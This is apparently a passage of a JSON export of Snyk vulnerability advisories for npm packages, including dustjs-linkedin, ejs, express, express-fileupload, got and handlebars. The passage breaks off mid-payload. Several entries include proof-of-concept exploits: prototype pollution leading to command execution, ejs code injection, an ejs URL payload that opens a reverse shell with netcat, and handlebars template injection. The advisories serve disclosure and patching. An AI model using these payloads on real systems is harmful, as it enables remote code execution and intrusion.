                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/mscdex/dicer/pull/22",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-DUSTJSLINKEDIN-1089257",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[dustjs-linkedin](https://www.npmjs.com/package/dustjs-linkedin) is a Javascript templating engine designed to run asynchronously on both the server and the browser.\n\nAffected versions of this package are vulnerable to Prototype Pollution. It is possible to pollute the `blocks` Array attribute of the object `context` within the `compileBlocks` function. This vulnerability can be leveraged for code execution since this property is added to the `compiled` function, which is then executed by the `VM` module.\r\n\r\n## PoC\r\n\r\n```js\r\nconst dust = require('dustjs-linkedin');\r\n\r\n\r\nlet cmd = \"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('curl 127.0.0.1')\"\r\nObject.prototype.ANY_CODE= [cmd];\r\nconst compiled = dust.compile(`{username} is a valid Dust reference.{~n}`);\r\nconst tmpl = dust.loadSource(compiled);\r\ndust.render(tmpl, { username: \"byc_404\" }, (err, out) => {\r\n    if (err) throw err;\r\n    console.log(out);\r\n});\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `dustjs-linkedin` to version 3.0.0 or higher.\n## References\n- [GitHub Advisory](https://github.com/advisories/GHSA-c6rp-wrp9-qr4q)\n- [GitHub Commit](https://github.com/linkedin/dustjs/pull/805/commits/ddb6523832465d38c9d80189e9de60519ac307c3)\n- [GitHub Issue](https://github.com/linkedin/dustjs/issues/804)\n- [GitHub PR](https://github.com/linkedin/dustjs/pull/805)\n",
        "created_at": "2021-03-26T13:20:28Z",
        "updated_at": "2024-03-11T09:52:53Z",
        "problems": [
          {
            "id": "CVE-2021-4264",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.0.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.6,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L/E:P/RL:U/RC:R"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-03-26T13:19:46Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-04-26T16:18:43Z",
            "references": [
              {
                "url": "https://github.com/advisories/GHSA-c6rp-wrp9-qr4q",
                "title": "GitHub Advisory"
              },
              {
                "url": "https://github.com/linkedin/dustjs/pull/805/commits/ddb6523832465d38c9d80189e9de60519ac307c3",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/linkedin/dustjs/issues/804",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/linkedin/dustjs/pull/805",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-EJS-1049328",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary Code Injection",
        "description": "## Overview\n[ejs](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\n\nAffected versions of this package are vulnerable to Arbitrary Code Injection via the `render` and `renderFile`. If external input is flowing into the `options` parameter, an attacker is able run arbitrary code. This include the `filename`, `compileDebug`, and `client` option.\r\n\r\n## POC\r\n```\r\nlet ejs = require('ejs')\r\nejs.render('./views/test.ejs',{\r\n    filename:'/etc/passwd\\nfinally { this.global.process.mainModule.require(\\'child_process\\').execSync(\\'touch EJS_HACKED\\') }',\r\n    compileDebug: true,\r\n    message: 'test',\r\n    client: true\r\n})\r\n```\n## Remediation\nUpgrade `ejs` to version 3.1.6 or higher.\n## References\n- [GitHub Commit](https://github.com/mde/ejs/commit/abaee2be937236b1b8da9a1f55096c17dda905fd)\n- [GitHub Issue](https://github.com/mde/ejs/issues/571)\n",
        "created_at": "2020-12-09T11:56:59Z",
        "updated_at": "2024-03-06T14:03:58Z",
        "problems": [
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.1.6 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.1.6"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.1.6"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 4.1,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L/E:P/RL:U/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2020-12-09T11:56:29Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-01-20T16:41:56Z",
            "references": [
              {
                "url": "https://github.com/mde/ejs/commit/abaee2be937236b1b8da9a1f55096c17dda905fd",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/mde/ejs/issues/571",
                "title": "GitHub Issue"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-EJS-2803307",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Remote Code Execution (RCE)",
        "description": "## Overview\n[ejs](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the `view options` parameter of `renderFile`, which makes it possible to inject code into `outputFunctionName`.\r\n\r\n\r\n**Note:**\r\nThis vulnerability is exploitable only if the server is already vulnerable to Prototype Pollution.\r\n\r\n## PoC:\r\nCreation of reverse shell:\r\n```\r\nhttp://localhost:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s\r\n```\n## Remediation\nUpgrade `ejs` to version 3.1.7 or higher.\n## References\n- [GitHub Commit](https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf)\n- [GitHub Issue](https://github.com/mde/ejs/issues/451)\n- [GitHub Release](https://github.com/mde/ejs/releases)\n- [Security Advisory](https://eslam.io/posts/ejs-server-side-template-injection-rce/)\n- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-29078.yaml)\n",
        "created_at": "2022-04-26T09:01:03Z",
        "updated_at": "2024-06-03T08:53:17Z",
        "problems": [
          {
            "id": "CVE-2022-29078",
            "source": "CVE"
          },
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.1.7 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.1.7"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.1.7"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 8.1,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2022-04-26T08:36:18Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-04-26T13:41:31Z",
            "references": [
              {
                "url": "https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/mde/ejs/issues/451",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/mde/ejs/releases",
                "title": "GitHub Release"
              },
              {
                "url": "https://eslam.io/posts/ejs-server-side-template-injection-rce/",
                "title": "Security Advisory"
              },
              {
                "url": "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-29078.yaml",
                "title": "Nuclei Templates"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-EJS-6689533",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Improper Control of Dynamically-Managed Code Resources",
        "description": "## Overview\n[ejs](https://www.npmjs.com/package/ejs) is a popular JavaScript templating engine.\n\nAffected versions of this package are vulnerable to Improper Control of Dynamically-Managed Code Resources due to the lack of certain pollution protection mechanisms. An attacker can exploit this vulnerability to manipulate object properties that should not be accessible or modifiable.\r\n\r\n**Note:**\r\n\r\nEven after updating to the fix version that adds enhanced protection against prototype pollution, it is still possible to override the `hasOwnProperty` method.\n## Remediation\nUpgrade `ejs` to version 3.1.10 or higher.\n## References\n- [GitHub Commit](https://github.com/mde/ejs/commit/e469741dca7df2eb400199e1cdb74621e3f89aa5)\n",
        "created_at": "2024-04-29T10:24:24Z",
        "updated_at": "2024-05-08T08:18:02Z",
        "problems": [
          {
            "id": "CVE-2024-33883",
            "source": "CVE"
          },
          {
            "id": "CWE-915",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.1.10 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.1.10"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.1.10"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2024-04-28T16:42:41Z",
            "exploit": "Not Defined",
            "publication_time": "2024-04-29T10:24:25Z",
            "references": [
              {
                "url": "https://github.com/mde/ejs/commit/e469741dca7df2eb400199e1cdb74621e3f89aa5",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-EXPRESS-6474509",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Open Redirect",
        "description": "## Overview\n[express](https://github.com/expressjs/express) is a minimalist web framework.\n\nAffected versions of this package are vulnerable to Open Redirect due to the implementation of URL encoding using `encodeurl` before passing it to the `location` header. This can lead to unexpected evaluations of malformed URLs by common redirect allow list implementations in applications, allowing an attacker to bypass a properly implemented allow list and redirect users to malicious sites.\n## Remediation\nUpgrade `express` to version 4.19.2, 5.0.0-beta.3 or higher.\n## References\n- [Github Commit](https://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94)\n- [GitHub Commit](https://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd)\n- [Github Issue](https://github.com/koajs/koa/issues/1800)\n- [GitHub PR](https://github.com/expressjs/express/pull/5551)\n",
        "created_at": "2024-03-21T07:57:40Z",
        "updated_at": "2024-06-08T14:11:46Z",
        "problems": [
          {
            "id": "CVE-2024-29041",
            "source": "CVE"
          },
          {
            "id": "CWE-601",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.19.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.19.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.19.2,>=5.0.0-alpha.1 <5.0.0-beta.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 6.1,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2024-03-20T15:16:03Z",
            "exploit": "Not Defined",
            "publication_time": "2024-03-26T07:34:23Z",
            "references": [
              {
                "url": "https://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94",
                "title": "Github Commit"
              },
              {
                "url": "https://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/koajs/koa/issues/1800",
                "title": "Github Issue"
              },
              {
                "url": "https://github.com/expressjs/express/pull/5551",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-EXPRESSFILEUPLOAD-2635697",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary File Upload",
        "description": "## Overview\n[express-fileupload](https://github.com/richardgirges/express-fileupload) is a file upload middleware for express that wraps around busboy.\n\nAffected versions of this package are vulnerable to Arbitrary File Upload that allows attackers to execute arbitrary code when uploading a crafted PHP file.\r\n\r\n**NOTE:** The maintainers of this package dispute its validity on the grounds that the attack vector described is the normal usage of the package.\n## Remediation\nThere is no fixed version for `express-fileupload`.\n\n## References\n- [GitHub Issue](https://github.com/richardgirges/express-fileupload/issues/312)\n- [GitHub Issue](https://github.com/richardgirges/express-fileupload/issues/316)\n- [PoC](https://www.youtube.com/watch?v=4XpofFi84KI)\n",
        "created_at": "2022-04-13T09:50:23Z",
        "updated_at": "2024-03-11T09:49:11Z",
        "problems": [
          {
            "id": "CVE-2022-27140",
            "source": "CVE"
          },
          {
            "id": "CWE-434",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": null,
            "representation": [
              {
                "resource_path": "*"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-04-13T09:47:38Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-08-01T15:29:44Z",
            "references": [
              {
                "url": "https://github.com/richardgirges/express-fileupload/issues/312",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/richardgirges/express-fileupload/issues/316",
                "title": "GitHub Issue"
              },
              {
                "url": "https://www.youtube.com/watch?v=4XpofFi84KI",
                "title": "PoC"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-EXPRESSFILEUPLOAD-2635946",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary File Upload",
        "description": "## Overview\n[express-fileupload](https://github.com/richardgirges/express-fileupload) is a file upload middleware for express that wraps around busboy.\n\nAffected versions of this package are vulnerable to Arbitrary File Upload when it is possible for attackers to upload multiple files with the same name, causing an overwrite of files in the web application server.\n## Remediation\nThere is no fixed version for `express-fileupload`.\n\n## References\n- [GitHub Issue](https://github.com/richardgirges/express-fileupload/issues/312)\n- [GitHub Issue](https://github.com/richardgirges/express-fileupload/issues/316)\n- [PoC](https://www.youtube.com/watch?v=3ROHB3ck4tA)\n",
        "created_at": "2022-04-13T12:08:52Z",
        "updated_at": "2024-03-11T09:49:11Z",
        "problems": [
          {
            "id": "CVE-2022-27261",
            "source": "CVE"
          },
          {
            "id": "CWE-434",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": null,
            "representation": [
              {
                "resource_path": "*"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-04-13T12:06:35Z",
            "exploit": "Proof of Concept",
            "publication_time": "2022-08-01T15:29:31Z",
            "references": [
              {
                "url": "https://github.com/richardgirges/express-fileupload/issues/312",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/richardgirges/express-fileupload/issues/316",
                "title": "GitHub Issue"
              },
              {
                "url": "https://www.youtube.com/watch?v=3ROHB3ck4tA",
                "title": "PoC"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-EXPRESSFILEUPLOAD-473997",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Denial of Service (DoS)",
        "description": "## Overview\n[express-fileupload](https://github.com/richardgirges/express-fileupload) is a file upload middleware for express that wraps around busboy.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package does not limit file name length.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `express-fileupload` to version 1.1.6-alpha.6 or higher.\n## References\n- [GitHub PR](https://github.com/richardgirges/express-fileupload/pull/171)\n",
        "created_at": "2019-10-22T12:22:54Z",
        "updated_at": "2024-03-06T13:59:00Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.1.6-alpha.6 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.1.6-alpha.6"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.1.6-alpha.6"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2019-10-18T11:17:09Z",
            "exploit": "Not Defined",
            "publication_time": "2019-10-22T15:08:40Z",
            "references": [
              {
                "url": "https://github.com/richardgirges/express-fileupload/pull/171",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-EXPRESSFILEUPLOAD-595969",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[express-fileupload](https://github.com/richardgirges/express-fileupload) is a file upload middleware for express that wraps around busboy.\n\nAffected versions of this package are vulnerable to Prototype Pollution. If the `parseNested` option is enabled, sending a corrupt HTTP request can lead to denial of service or arbitrary code execution.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `express-fileupload` to version 1.1.10 or higher.\n## References\n- [GitHub Issue](https://github.com/richardgirges/express-fileupload/issues/236)\n- [GitHub PR](https://github.com/richardgirges/express-fileupload/commit/9fca550f08a9dc07cc3500921f4fa7879cf88b8f)\n- [POSIX Vulnerability Blog](https://blog.p6.is/Real-World-JS-1/)\n",
        "created_at": "2020-07-29T15:43:45Z",
        "updated_at": "2024-03-11T09:51:10Z",
        "problems": [
          {
            "id": "CVE-2020-7699",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 1.1.10 to fix this vulnerability",
                "details": {
                  "upgrade_package": "1.1.10"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<1.1.10"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-07-29T15:08:59Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-07-30T15:28:18Z",
            "references": [
              {
                "url": "https://github.com/richardgirges/express-fileupload/issues/236",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/richardgirges/express-fileupload/commit/9fca550f08a9dc07cc3500921f4fa7879cf88b8f",
                "title": "GitHub PR"
              },
              {
                "url": "https://blog.p6.is/Real-World-JS-1/",
                "title": "POSIX Vulnerability Blog"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-GOT-2932019",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Open Redirect",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
        "created_at": "2022-06-19T09:23:24Z",
        "updated_at": "2024-03-11T09:53:59Z",
        "problems": [
          {
            "id": "CVE-2022-33987",
            "source": "CVE"
          },
          {
            "id": "CWE-601",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 11.8.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "11.8.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<11.8.5,>=12.0.0 <12.1.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.4,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2022-06-19T08:33:16Z",
            "exploit": "Not Defined",
            "publication_time": "2022-06-19T15:33:44Z",
            "references": [
              {
                "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
                "title": "GitHub Diff"
              },
              {
                "url": "https://github.com/sindresorhus/got/pull/2047",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-1056767",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Remote Code Execution (RCE)",
        "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) when selecting certain compiling options to compile templates coming from an untrusted source.\r\n\r\n### POC\r\n```\r\n<script src=\"https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js\"></script> \r\n<script> \r\n// compile the template \r\nvar s = ` \r\n{{#with (__lookupGetter__ \"__proto__\")}} \r\n{{#with (./constructor.getOwnPropertyDescriptor . \"valueOf\")}} \r\n{{#with ../constructor.prototype}} \r\n{{../../constructor.defineProperty . \"hasOwnProperty\" ..}} \r\n{{/with}} \r\n{{/with}} \r\n{{/with}} \r\n{{#with \"constructor\"}} \r\n{{#with split}} \r\n{{pop (push \"alert('Vulnerable Handlebars JS when compiling in strict mode');\")}} \r\n{{#with .}} \r\n{{#with (concat (lookup join (slice 0 1)))}} \r\n{{#each (slice 2 3)}} \r\n{{#with (apply 0 ../..)}} \r\n{{.}} \r\n{{/with}} \r\n{{/each}} \r\n{{/with}} \r\n{{/with}} \r\n{{/with}} \r\n{{/with}} \r\n`;\r\nvar template = Handlebars.compile(s, { \r\nstrict: true \r\n}); \r\n// execute the compiled template and print the output to the console console.log(template({})); 